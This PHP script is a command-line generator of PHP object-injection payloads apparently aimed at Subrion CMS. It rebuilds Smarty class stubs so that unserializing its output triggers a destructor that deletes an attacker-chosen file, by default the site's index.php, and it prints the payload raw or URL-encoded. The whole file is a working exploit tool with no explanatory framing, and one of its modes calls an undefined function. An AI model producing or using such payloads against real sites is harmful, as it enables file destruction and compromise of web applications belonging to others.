<?php
error_reporting(0);

define('IA_HOME', '/var/www/html/subrion/');

abstract class Smarty_CacheResource
{}

class Smarty_Internal_CacheResource_File extends Smarty_CacheResource
{
    public function releaseLock(Smarty $smarty, Smarty_Template_Cached $cached)
    {
        $cached->is_locked = false;
        unlink($cached->lock_id);
    }
}

class Smarty_Template_Cached
{
    public $lock_id = null;
    public $is_locked = true;

    public function __construct()
    {
        $this->handler = new Smarty_Internal_CacheResource_File();
        $this->lock_id = IA_HOME . 'index.php';
    }

    public function setlock($lock_id){
        if($lock_id){
            $this->lock_id = $lock_id;
        }
    }
}

class Smarty_Internal_TemplateBase
{}

class Smarty extends Smarty_Internal_TemplateBase{
    public $cache_locking = true;
    public $cache_dir;
    public $use_sub_dirs;
    public function __construct(){
        $this->cache_locking = 1;
        $this->cache_dir = "/";
        $this->use_sub_dirs = true;
        $this->cache = true;
    }
}

class Smarty_Internal_Template extends Smarty_Internal_TemplateBase{

    public $cached;
    public $smarty;

    public function __construct(){
        $this->smarty = new Smarty();
        $this->cached = new Smarty_Template_Cached();
    }

    public function setlock($lock_id){
        $this->cached->setlock($lock_id);
    }

    public function __destruct()
    {
        if ($this->smarty->cache_locking && isset($this->cached) && $this->cached->is_locked) {
            $this->cached->handler->releaseLock($this->smarty, $this->cached);
        }
    }
}

class iaSmarty{
    public $resources = array("jquery" => "1");
}

class Serializer{

    public static function serialize_object($type, $lock_id=null, $urlenc=false){
        $object = new Smarty_Internal_Template();
        if($lock_id){
            $object->setlock($lock_id);
        }
        if ($type == "a"){
            $payload = array( "s" => new iaSmarty(), "d" => $object);
        }else{
            $payload = $object;
        }
        $serial_object = serialize($payload);
        if($urlenc){
            echo urlencode($serial_object);
        }else{
            echo $serial_object;
        }
    }

    public static function deserialize_object(){
        $test = serialize_object();
        echo unserialize($test);
        return unserialize($test);
    }

    public static function desertest($testpayload){
        echo "[*] Deserializing:\n";
        echo $testpayload;
        print_r(unserialize($testpayload));
    }
}


if ($argv && $argv[0] && realpath($argv[0]) === __FILE__) {

    $args = getopt("c:f:t:u");
    switch ($args["c"]){
        case "t":
            if (empty($args["t"])){
                die("[-] Expecting test resource");
            }
            Serializer::desertest($args["t"]);
            break;
        case "s":
            $type = "o";
            if ($args["t"] && ($args["t"] == "a" || $args["t"] == "o")){
                $type = $args["t"];
            }
            $file = null;
            if ($args["f"]){
                $file = $args["f"];
            }
            $urlenc = false;
            if ($args["u"] === false){
                $urlenc = true;
            }
            Serializer::serialize_object($type, $file, $urlenc);
            break;
        case "d":
            Serializer::deserialize_object();
            break;
        default:
            echo "[-] Missing required argument -c [d|s|t]\n";

    }
}

?>
